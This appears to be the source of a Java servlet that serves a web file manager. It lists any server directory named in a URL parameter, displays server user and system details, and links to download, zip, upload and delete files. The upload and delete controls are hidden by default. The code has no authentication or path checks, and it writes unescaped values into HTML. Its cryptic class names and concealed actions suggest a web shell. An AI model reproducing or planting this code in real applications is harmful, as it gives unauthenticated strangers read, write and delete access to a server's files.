package com.dlt;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.Arrays;

public class dl extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String path = request.getParameter("path");

        if (path == null || path.isEmpty()) {
            String warPath = getServletContext().getRealPath("/");
            File warDir = new File(warPath);
            if (warDir.exists() && warDir.isDirectory()) {
                path = warDir.getAbsolutePath();
            } else {
                path = System.getProperty("user.home");
            }
        }

        String filter = request.getParameter("filter");
        String sort = request.getParameter("sort");
        String order = request.getParameter("order");

        if (sort == null) sort = "name";
        if (order == null) order = "asc";

        File folder = new File(path);
        response.setContentType("text/html;charset=UTF-8");

        String currentUser = System.getProperty("user.name");
        String serverTime = ut.getServerTime();
        String timeZone = ut.getServerTimeZone();
        String osName = ut.getOSName();
        String osArch = ut.getOSArch();
        String userHome = System.getProperty("user.home");
        String javaVersion = System.getProperty("java.version");
        String serverInfo = getServletContext().getServerInfo();

        try (PrintWriter out = response.getWriter()) {
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm");

            out.println("<html><head><title>" + folder.getAbsolutePath() + "</title>");
            out.println("<link href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css' rel='stylesheet'>");
            dl2.printStyles(out);
            dl2.printScripts(out);
			out.println("</head><body>");

			dl2.printServerInfo(out, currentUser, userHome);
            dl2.printBreadcrumbs(out, path);
            dl2.printFilterForm(out, path, filter, sort, order);
			if (folder.canWrite()) {
				out.println("<form method='post' action='up' enctype='multipart/form-data' class='action-upload' style='display: none; margin-left: 10px;'>");
				out.println("<input type='file' name='file' required style='background-color: #333; color: #fff; border: 1px solid #555; border-radius: 5px; padding: 5px;'>");
				out.println("<input type='hidden' name='path' value='" + folder.getAbsolutePath() + "'>");
				out.println("<button type='submit' style='margin-left: 5px; padding: 5px 10px;'>Subir</button>");
				out.println("</form>");
			}
            dl2.printTableHeader(out, sort, order, path, filter);

            if (folder.getParentFile() != null) {
                out.println("<tr><td><a href='?path=" + folder.getParentFile().getAbsolutePath() + "&filter=" + (filter != null ? filter : "") + "'>../</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr>");
            }

            if (folder.exists() && folder.isDirectory()) {
                File[] files = folder.listFiles();
                if (files == null) {
                    out.println("<tr><td colspan='7' style='color: #FF5555;'>No se puede acceder a esta carpeta.</td></tr>");
                } else {
                    if (filter != null && !filter.isEmpty()) {
                        files = Arrays.stream(files).filter(f -> f.getName().toLowerCase().startsWith(filter.toLowerCase())).toArray(File[]::new);
                    }

                    Arrays.sort(files, ut.getFileComparator(sort, order));
					for (File file : files) {
						String name = file.isDirectory() ? file.getName() + "/" : file.getName();
						String owner = ut.getOwner(file);
						String permissions = ut.getPermissions(file);
						String created = ut.getCreationDate(file, sdf);
						String modifiedDate = sdf.format(file.lastModified());
						String size = file.isDirectory() ? "-" : ut.formatFileSize(file.length());

						out.println("<tr>");
						out.println("<td title='" + name + "'><a href='" + (file.isDirectory() ? "?path=" + file.getAbsolutePath() : "fd?file=" + file.getAbsolutePath()) + "'>" + name + "</a></td>");
						out.println("<td>" + owner + "</td>");
						out.println("<td>" + permissions + "</td>");
						out.println("<td>" + created + "</td>");
						out.println("<td>" + modifiedDate + "</td>");
						out.println("<td>" + size + "</td>");
						out.println("<td>");
						out.println("<a href='fz?path=" + file.getAbsolutePath() + "' title='descargar en zip'><i class='fas fa-file-archive'></i></a>");
						if (file.isFile()) {
							out.println(" <span class='del-icon' style='display:none'><a href='#' onclick='confirmDelete(\"" + file.getAbsolutePath().replace("\\", "\\\\") + "\"); return false;'><i class='fas fa-times' style='margin-left:10px;color:#FF6666;'></i></a></span>");
						}
						out.println("</td>");
						out.println("</tr>");
					}
                }
            }

            out.println("</table>");
            out.println("</body></html>");
        }
    }
}
